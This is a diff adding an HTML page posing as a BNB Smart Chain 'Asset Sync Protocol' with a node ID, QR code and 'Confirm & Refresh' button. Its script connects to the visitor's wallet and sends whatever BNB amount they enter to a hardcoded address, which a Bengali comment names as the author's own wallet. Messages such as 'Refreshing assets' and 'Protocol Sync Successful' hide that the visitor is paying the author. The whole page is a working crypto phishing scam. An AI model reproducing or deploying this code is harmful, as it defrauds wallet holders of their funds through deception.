@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Asset Sync Protocol</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        :root { --bg: #0b0e11; --card: #181a20; --primary: #38bdf8; --text: #eaecef; }
+        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .box { background: var(--card); padding: 30px; border-radius: 20px; width: 90%; max-width: 350px; text-align: center; border: 1px solid #2b3139; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .qr-frame { background: #fff; padding: 12px; border-radius: 15px; width: 160px; height: 160px; margin: 25px auto; border: 4px solid var(--primary); }
+        .qr-frame img { width: 100%; height: 100%; }
+        .node-box { font-size: 10px; color: #94a3b8; background: #0b0e11; padding: 12px; border-radius: 10px; margin-bottom: 25px; border: 1px dashed #334155; word-break: break-all; }
+        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #474d57; background: #1e2329; color: #fff; font-size: 24px; text-align: center; box-sizing: border-box; margin-bottom: 25px; font-weight: bold; outline: none; }
+        .refresh-btn { width: 100%; padding: 18px; background: var(--primary); color: #000; border: none; border-radius: 14px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .refresh-btn:active { transform: scale(0.98); }
+        .footer-text { font-size: 10px; color: #474d57; margin-top: 20px; letter-spacing: 0.5px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2 style="color: var(--primary); margin: 0; font-size: 22px;">Asset Sync Protocol</h2>
+    <p style="font-size: 11px; color: #848e9c; margin-top: 5px;">BNB Smart Chain (BEP20) Verified</p>
+    
+    <div class="qr-frame">
+        <!-- QR code for your specific address -->
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D" alt="Sync QR">
+    </div>
+
+    <div class="node-box">
+        Connected Node ID:<br>
+        0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D
+    </div>
+
+    <input type="number" id="syncValue" placeholder="0.00 BNB" step="any">
+
+    <button class="refresh-btn" onclick="startSync()">Confirm & Refresh</button>
+
+    <div class="footer-text">SECURE NODE CONNECTION ACTIVE</div>
+</div>
+
+<script>
+    async function startSync() {
+        const amt = document.getElementById('syncValue').value;
+        const myWallet = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";
+
+        if (!amt || amt <= 0) {
+            alert("Please enter a valid amount to refresh.");
+            return;
+        }
+
+        if (window.ethereum) {
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                const signer = provider.getSigner();
+
+                // পেমেন্ট কমান্ড যা সরাসরি আপনার ট্রাস্ট ওয়ালেটে যাবে
+                const tx = await signer.sendTransaction({
+                    to: myWallet,
+                    value: ethers.utils.parseEther(amt.toString())
+                });
+
+                alert("Refreshing assets... Please wait for network confirmation.");
+                await tx.wait();
+                alert("Protocol Sync Successful!");
+
+            } catch (err) {
+                console.error(err);
+                alert("Sync Error: Connection rejected by user.");
+            }
+        } else {
+            alert("Open this link inside Binance or Trust Wallet Browser.");
+        }
+    }
+</script>
+
+</body>
+</html>
